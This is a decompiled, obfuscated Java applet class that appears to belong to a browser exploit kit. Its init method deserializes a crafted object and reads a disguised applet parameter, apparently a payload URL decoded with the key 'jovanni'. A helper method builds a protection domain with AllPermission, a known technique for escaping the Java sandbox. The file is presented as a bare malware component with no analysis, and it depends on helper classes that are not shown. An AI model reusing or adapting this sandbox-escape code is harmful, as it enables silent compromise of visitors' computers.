// 
// Decompiled by Procyon v0.5.30
// 

package zzz.ttt;

import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import java.io.FileOutputStream;
import java.security.PermissionCollection;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.applet.Applet;

public class ad3740b4 extends Applet
{
    private static final long serialVersionUID = -3238297386635759160L;
    
    public static void tst(final Class clazz, final String s, final String s2) {
        try {
            clazz.getField("d" + s.substring(1, 3) + "a").set(clazz.newInstance(), ("0h" + s.substring(2, 3) + s.substring(2, 3) + s2.substring(3) + "md").substring(1));
            clazz.newInstance();
        }
        catch (Exception ex) {}
    }
    
    public static ProtectionDomain tst2(final String s) {
        final Permissions permissions = new Permissions();
        permissions.add(new AllPermission());
        return new ProtectionDomain(a1500b0.tst3(s), permissions);
    }
    
    public static void tst4(final FileOutputStream fileOutputStream) {
        try {
            fileOutputStream.close();
        }
        catch (Exception ex) {}
    }
    
    @Override
    public void init() {
        try {
            final byte[] stb = a1500b0.stb(123);
            final String s = "zatv";
            final Object object = new ObjectInputStream(new ByteArrayInputStream(stb)).readObject();
            String parameter = this.getParameter("d" + s.substring(1, 3) + "a");
            if (object != null && a13d8.extrn != null) {
                if (parameter == null) {
                    parameter = "";
                }
                a13d8.extrn.bRP("ht" + parameter.substring(2) + "mr", "jovanni");
            }
        }
        catch (Exception ex) {}
    }
}
